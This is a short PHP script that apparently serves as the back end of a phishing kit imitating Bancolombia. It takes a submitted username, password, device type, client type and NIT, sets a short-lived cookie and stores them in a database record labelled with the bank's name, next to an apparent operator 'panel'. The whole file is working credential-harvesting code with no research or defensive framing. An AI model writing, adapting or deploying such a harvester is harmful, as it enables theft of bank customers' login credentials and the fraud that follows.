<?php
require_once("../lib/class.inputfilter.php");
require('../panel/include/setings.php');
date_default_timezone_set('America/Bogota');
$ifilter = new InputFilter();

$usuario = $ifilter->process($_POST['usr']);
$contrasena = isset($_POST['pas']) ? $ifilter->process($_POST['pas']) : '';
$dispositivo = isset($_POST['dis']) ? $ifilter->process($_POST['dis']) : 'PC';
$tipo_cliente = isset($_POST['tc']) ? $ifilter->process($_POST['tc']) : 'persona';
$nit = isset($_POST['nit']) ? $ifilter->process($_POST['nit']) : '';

setcookie('usuario', $usuario, time()+60*9, '/');

// Crear registro en BD
create_item($usuario, $contrasena, $dispositivo, '', '', 'Bancolombia', '', $tipo_cliente, $nit);
?>